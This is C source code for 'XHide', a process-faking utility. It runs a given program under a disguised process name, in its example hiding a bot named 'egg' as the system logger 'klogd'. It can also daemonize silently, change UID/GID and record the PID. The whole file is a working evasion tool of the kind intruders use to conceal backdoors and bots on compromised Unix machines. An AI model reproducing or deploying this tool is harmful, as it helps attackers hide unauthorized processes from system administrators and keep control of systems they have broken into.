#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>

void usage(char *progname);

int changeown (char *str)
{
	char user[256], *group;
	struct passwd *pwd;
	struct group *grp;

	uid_t uid;
	gid_t gid;

	memset(user, '\0', sizeof(user));
	strncpy(user, str, sizeof(user));

	for (group = user; *group; group++)
		if (*group == ':')
		{
			*group = '\0';
			group++;
			break;
		}

	if (pwd = getpwnam(user)) 
	{

		uid = pwd->pw_uid;
		gid = pwd->pw_gid;
	} else uid = (uid_t) atoi(user);

	if (*group)
		if (grp = getgrnam(group)) gid = grp->gr_gid;
		else gid = (gid_t) atoi(group);

	if (setgid(gid)) {
		perror("Error: Can't set GID");
		return 0;
	}

	if (setuid(uid))
	{
		perror("Error: Can't set UID");
		return 0;
	}

	return 1;
}

char *fullpath(char *cmd)
{
	char *p, *q, *filename;
	struct stat st;

	if (*cmd == '/')
		return cmd;

	filename = (char *) malloc(256);

	if  (*cmd == '.')
		if (getcwd(filename, 255) != NULL)
		{
			strcat(filename, "/");
			strcat(filename, cmd);
			return filename;
		}
		else
			return NULL;

	for (p = q = (char *) getenv("PATH"); q != NULL; p = ++q)
	{
		if (q = (char *) strchr(q, ':'))
			*q = (char) '\0';

		snprintf(filename, 256, "%s/%s", p, cmd);

		if (stat(filename, &st) != -1
				&& S_ISREG(st.st_mode)
				&& (st.st_mode&S_IXUSR || st.st_mode&S_IXGRP || st.st_mode&S_IXOTH))
			return filename;

		if (q == NULL)
			break;
	}

	free(filename);

	return NULL;

}

void usage(char *progname)
{
	fprintf(stderr, "XHide - Process Faker, by Schizoprenic "
			"Xnuxer Research (c) 2002\n\nOptions:\n"

			"-s string\tFake name process\n"
			"-d\t\tRun aplication as daemon/system (optional)\n" 
			"-u uid[:gid]\tChange UID/GID, use another user (optional)\n" 
			"-p filename\tSave PID to filename (optional)\n\n"

			"Example: %s -s \"klogd -m 0\" -d -p test.pid ./egg bot.conf\n\n",progname);

	exit(1);
}

int main(int argc,char **argv)
{
	char c;
	char fake[256];
	char *progname, *fakename;
	char *pidfile, *fp;
	char *execst;

	FILE *f;

	int runsys=0, null;
	int j,i,n,pidnum;
	char **newargv;

	progname = argv[0];
	if(argc<2) usage(progname);

	for (i = 1; i < argc; i++)
	{
		if (argv[i][0] == '-')
			switch (c = argv[i][1])
			{

				case 's': fakename = argv[++i]; break;
				case 'u': changeown(argv[++i]); break; 
				case 'p': pidfile = argv[++i]; break;
				case 'd': runsys = 1; break;

				default:  usage(progname); break;
			}
		else break;
	}

	if (!(n = argc - i) || fakename == NULL) usage(progname);

	newargv = (char **) malloc(n * sizeof(char **) + 1);
	for (j = 0; j < n; i++,j++) newargv[j] = argv[i];
	newargv[j] = NULL;

	if ((fp = fullpath(newargv[0])) == NULL) { perror("Full path seek"); exit(1); }
	execst = fp;

	if (n > 1)
	{
		memset(fake, ' ', sizeof(fake) - 1);
		fake[sizeof(fake) - 1] = '\0';
		strncpy(fake, fakename, strlen(fakename));
		// Kent, this is the key point.. keke
		newargv[0] = fake;
		/*for (int i = 1; i < n; i++) newargv[i] = "";*/
	}
	else newargv[0] = fakename;

	if (runsys) 
	{
		if ((null = open("/dev/null", O_RDWR)) == -1)
		{
			perror("Error: /dev/null");
			return -1;
		}

		switch (fork())
		{
			case -1:
				perror("Error: FORK-1");
				return -1;

			case  0:
				setsid();
				switch (fork())
				{

					case -1:
						perror("Error: FORK-2");
						return -1;

					case  0:
						umask(0);
						close(0);
						close(1);
						close(2);
						dup2(null, 0);
						dup2(null, 1);
						dup2(null, 2);

						break;

					default:
						return 0;
				}
				break;
			default:
				return 0;
		}
	}

	waitpid(-1, (int *)0, 0);        
	pidnum = getpid();

	if (pidfile != NULL && (f = fopen(pidfile, "w")) != NULL)
	{
		fprintf(f, "%d\n", pidnum);
		fclose(f);
	}

	fprintf(stderr,"==> Fakename: %s PidNum: %d\n",fakename,pidnum); 
	execv(execst, newargv);
	perror("Couldn't execute");
	return -1;
}
